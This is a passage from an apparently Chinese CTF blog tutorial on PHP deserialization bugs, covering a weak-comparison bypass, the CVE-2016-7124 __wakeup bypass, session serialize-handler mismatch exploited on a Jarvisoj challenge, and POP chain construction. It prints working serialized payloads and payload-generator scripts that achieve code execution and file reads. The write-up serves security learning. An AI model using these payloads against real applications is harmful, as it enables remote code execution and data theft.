class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，如果op == “1” 会调用write写入函数，如果op == “2”” 的话，会调用read函数。</p><p>所以需要使得op = “2”才能获取flag        上面__destruct()函数中为op === “2”</p><p>利用PHP弱类型的特性使得 op=” 2”即可绕过 === 时使得后面语句无法使用==空格会先做转义</p><p>然后执行read()函数</p><pre><code>private function read() &#123;    $res = &quot;&quot;;    if(isset($this-&gt;filename)) &#123;        $res = file_get_contents($this-&gt;filename);    &#125;    return $res;&#125;</code></pre><p>构造语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">    class FileHandler&#123;</span><br><span class="line">        public $op &#x3D; &#39; 2&#39;;</span><br><span class="line">        public $filename &#x3D; &#39;flag.php&#39;;</span><br><span class="line">        public $content &#x3D; &#39;ol4three&#39;;</span><br><span class="line">    &#125;   </span><br><span class="line">        $flag &#x3D; new FileHandler();</span><br><span class="line">        echo serialize($flag);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─$ php test.php</span><br><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:8:&quot;ol4three&quot;;&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:8:&quot;ol4three&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122172140545.png" alt="image-20210122172140545"></p><h1 id="反序列化对象注入"><a href="#反序列化对象注入" class="headerlink" title="反序列化对象注入"></a>反序列化对象注入</h1><h2 id="CVE-2016-7124-wakeup绕过"><a href="#CVE-2016-7124-wakeup绕过" class="headerlink" title="CVE-2016-7124 __wakeup绕过"></a>CVE-2016-7124 __wakeup绕过</h2><h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p><strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p><p>构造序列化对象：O:1:”A”:1:{s:6:”target”;s:18:”<?php phpinfo();?>“;}<br><strong>绕过__wakeup</strong>：O:1:”A”:<strong>2</strong>:{s:6:”target”;s:18:”<?php phpinfo();?>“;}</p><h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>php5 &lt; 5.6.25<br>php7 &lt; 7.0.10</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?    </span><br><span class="line">    class A&#123;</span><br><span class="line">        public $target &#x3D; &quot;test&quot;;</span><br><span class="line">        function __wakeup()&#123;</span><br><span class="line">            $this-&gt;target &#x3D; &quot;wakeup!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">            $fp &#x3D; fopen(&quot;&#x2F;Library&#x2F;WebServer&#x2F;Documents&#x2F;hello.php&quot;,&quot;w&quot;);</span><br><span class="line">            fputs($fp,$this-&gt;target);</span><br><span class="line">            fclose($fp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a &#x3D; $_GET[&#39;test&#39;];</span><br><span class="line">    $b &#x3D; unserialize($a);</span><br><span class="line">    echo &quot;hello.php&quot;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    include(&quot;.&#x2F;hello.php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>魔法函数<code>__wakeup()</code>要比<code>__destruct()</code>先执行，所以我们之间传入<br><code>O:1:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</code><br>时会被先执行的<code>__wakeup()</code>函数<code>$target</code>赋值覆盖为<code>wakeup!</code>，然后生成的<code>hello.php</code>里面的内容就是<code>wakeup!</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122174039083.png" alt="image-20210122174039083"></p><p>现在我们根据绕过方法：对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>的执行，对象个数原来是1我们将其改为2，也就是<br><code>O:2:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</code><br>就能实现绕过</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122180744274.png" alt="image-20210122180744274"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122180753722.png" alt="image-20210122180753722"></p><h1 id="Session-反序列化漏洞"><a href="#Session-反序列化漏洞" class="headerlink" title="Session 反序列化漏洞"></a>Session 反序列化漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化<br>在php.ini中有以下配置项，wamp的默认配置如图</p></blockquote><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122194708328.png" alt="image-20210122194708328"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122194716896.png" alt="image-20210122194716896"></p><p><code>session.save_path</code> 设置session的存储路径<br><code>session.save_handler</code> 设定用户自定义存储函数<br><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话<br><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php<br>除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同</p><ul><li>php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</li><li>php 键名＋竖线＋经过serialize()函数反序列处理的值</li><li>php_serialize serialize()函数反序列处理数组方式</li></ul><h2 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h2><p>php中的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值。<br>来测试一个demo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#39;name&#39;] &#x3D; &#39;ol4three&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行后在配置文件设定的路径中会生成一个session文件</p><p>存储引擎为php_serialize:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122200533548.png" alt="image-20210122200533548"></p><p>存储引擎为php:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122200603005.png" alt="image-20210122200603005"></p><p>存储引擎为php_binary:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122200634452.png" alt="image-20210122200634452"></p><p>三种处理器的存储格式差异，就会造成在session序列化和反序列化处理器设置不当时的安全隐患。</p><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><h3 id="Jarvisoj-Web"><a href="#Jarvisoj-Web" class="headerlink" title="Jarvisoj Web"></a>Jarvisoj Web</h3><blockquote><p>题目地址：<a href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;A webshell is wait for you</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;phpinfo&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m &#x3D; new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&#39;index.php&#39;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="http://web.jarvisoj.com:32784/index.php?phpinfo">http://web.jarvisoj.com:32784/index.php?phpinfo</a></p><p>先来看一看phpinfo里的内容 php版本：5.6.21<br><strong>php大于5.5.4的版本中默认使用php_serialize规则</strong></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122201357854.png" alt="image-20210122201357854"></p><p>默认为php_serialize而index.php中又使用了php，反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125094633177.png" alt="image-20210125094633177"></p><blockquote><p>PHP手册<br>Session 上传进度<br>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态<br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</p></blockquote><p>了解了之后，就可以通过POST方法来构造数据传入<code>$_SESSION</code><br>构造POST提交表单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>构造序列化字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz&#x3D;&#39;print_r(dirname(__FILE__));&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$obj &#x3D; new OowoO();</span><br><span class="line">$a &#x3D; serialize($obj);</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><p>注意需要转义，抓包吧filename改为payload<br>最终提交为：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:27:\&quot;print_r(dirname(__FILE__));\&quot;;&#125;</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125100500866.png" alt="image-20210125100500866"></p><p>目录/opt/lampp/htdocs<br><code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code>读目录</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125100541463.png" alt="image-20210125100541463"></p><p>用<code>file_get_contents</code>函数读flag<br><code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125100717889.png" alt="image-20210125100717889"></p><h1 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h1><h3 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h3><blockquote><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p></blockquote><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：<strong>进行反序列化的数据能够被用户输入所控制。</strong></p><h2 id="pop链利用"><a href="#pop链利用" class="headerlink" title="pop链利用"></a>pop链利用</h2><p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p><h2 id="实战训练"><a href="#实战训练" class="headerlink" title="实战训练"></a>实战训练</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 &#x3D; $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 &#x3D; &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;this_i3_you4_flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; $_GET[&#39;string&#39;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。</p><ol><li><code>string1</code>中的<code>__tostring</code>存在<code>$this-&gt;str1-&gt;get_flag()</code>，分析一下要自动调用<code>__tostring()</code>需要把类<code>string1</code>当成字符串来使用，因为调用的是参数<code>str1</code>的方法，所以需要把<code>str1</code>赋值为类<code>GetFlag</code>的对象。</li><li>发现类<code>func</code>中存在<code>__invoke</code>方法执行了字符串拼接，需要把<code>func</code>当成函数使用自动调用<code>__invoke</code>然后把<code>$mod1</code>赋值为<code>string1</code>的对象与<code>$mod2</code>拼接。</li><li>在<code>funct</code>中找到了函数调用，需要把<code>mod1</code>赋值为<code>func</code>类的对象，又因为函数调用在<code>__call</code>方法中，且参数为<code>$test2</code>,即无法调用<code>test2</code>方法时自动调用 <code>__call</code>方法；</li><li>在<code>Call</code>中的<code>test1</code>方法中存在<code>$this-&gt;mod1-&gt;test2();</code>，需要把<code>$mod1</code>赋值为<code>funct</code>的对象，让<code>__call</code>自动调用。</li><li>查找<code>test1</code>方法的调用点，在<code>start_gg</code>中发现<code>$this-&gt;mod1-&gt;test1();</code>，把<code>$mod1</code>赋值为<code>start_gg</code>类的对象，等待<code>__destruct()</code>自动调用。</li></ol><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 &#x3D; new Call();&#x2F;&#x2F;把$mod1赋值为Call类对象</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 &#x3D; new funct();&#x2F;&#x2F;把 $mod1赋值为funct类对象</span><br><span class="line">        &#125;</span><br><span class="line">        public function test1()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1&#x3D; new func();&#x2F;&#x2F;把 $mod1赋值为func类对象</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 &#x3D; $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1&#x3D; new string1();&#x2F;&#x2F;把 $mod1赋值为string1类对象</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;        </span><br><span class="line">                $this-&gt;mod2 &#x3D; &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1&#x3D; new GetFlag();&#x2F;&#x2F;把 $str1赋值为GetFlag类对象          </span><br><span class="line">        &#125;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;        </span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b &#x3D; new start_gg;&#x2F;&#x2F;构造start_gg类对象$b</span><br><span class="line">echo urlencode(serialize($b)).&quot;&lt;br &#x2F;&gt;&quot;;&#x2F;&#x2F;显示输出url编码后的序列化对象</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125101611775.png" alt="image-20210125101611775"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>反序列化漏洞一般都是在白盒审计时发现并利用，需要构造PHP序列化代码，利用条件比较苛刻。</p><p>总结一下PHP反序列化的挖掘思路，首先进行反序列化的数据点是用户可控的，然后反序列化类中需要有魔术方法，魔术方法中存在敏感操作，或者魔术方法中无敏感操作，但是其对象调用了其他类中的同名函数，可以通过构造POP链利用。</p><p>另外再贴一些相关文章，希望对大家有所帮助</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/6753">https://xz.aliyun.com/t/6753</a></p><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://xz.aliyun.com/t/3674#toc-17">https://xz.aliyun.com/t/3674#toc-17</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;反序列化：PHP程序为了保存和转储对象，提供了序列化的方法，PHP序列化是为了在程序运行的过程中对对象进行转储而产
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.ol4three.com/categories/CTF/"/>
    
    
      <category term="PHP反序列化" scheme="http://www.ol4three.com/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Spring Boot Actuator H2 RCE漏洞复现</title>
    <link href="http://www.ol4three.com/2021/01/22/WEB/Exploit/springboot/Spring-Boot-Actuator-H2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://www.ol4three.com/2021/01/22/WEB/Exploit/springboot/Spring-Boot-Actuator-H2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-01-22T02:32:23.000Z</published>
    <updated>2021-01-22T03:33:44.303Z</updated>
    
